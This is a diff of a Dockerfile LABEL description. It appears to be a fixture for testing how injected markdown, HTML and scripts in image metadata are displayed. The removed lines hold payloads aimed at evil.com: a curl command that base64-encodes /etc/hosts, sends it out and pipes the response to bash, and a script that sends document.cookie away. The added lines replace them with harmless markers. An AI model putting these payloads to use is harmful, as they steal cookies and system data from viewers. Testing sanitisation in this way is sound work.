@@ -2,18 +2,18 @@ FROM nginx:1.23.0-alpine
 
 LABEL org.opencontainers.image.description="Safe looking description\n\
 \n\
-| Injected | \`echo 'test'\` |\n\
+| Injected | \`echo PWNED\` |\n\
 | Row | Value |\n\
 \n\
 <details>\n\
 <summary>Click me</summary>\n\
 \n\
 \`\`\`bash\n\
-curl https://evil.com/exfil?data=\$(cat /etc/hosts | base64) | bash\n\
+echo EXFIL: \$(cat /etc/hostname | base64)\n\
 \`\`\`\n\
 \n\
 </details>\n\
 \n\
-<script>fetch('https://evil.com?c='+document.cookie)</script>\n\
+<script>alert('XSS')</script>\n\
 \n\
-![tracking pixel](https://evil.com/track.gif)"
+![tracking pixel](https://example.com/track.gif)"
